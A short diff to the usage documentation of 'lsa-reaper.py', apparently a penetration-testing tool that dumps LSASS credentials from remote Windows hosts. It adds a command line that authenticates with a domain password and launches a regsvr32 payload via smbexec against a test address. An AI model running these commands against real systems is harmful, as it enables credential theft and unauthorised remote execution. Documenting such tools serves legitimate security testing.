@@ -73,6 +73,8 @@ sudo python3 lsa-reaper.py -ip local_ip testdomain/testuser@10.0.0.100
 sudo python3 lsa-reaper.py -drive A testdomain/testuser@10.0.0.100
 
 sudo python3 lsa-reaper.py -localauth localuser@10.0.0.100
+
+sudo python3 lsa-reaper.py -ip eth0 testdomain/testuser:'P@ssw0rd!'@10.0.0.100 -payload regsvr32 -method smbexec -ap
 ```
 
 ![](/assets/Reaper-Running.png)
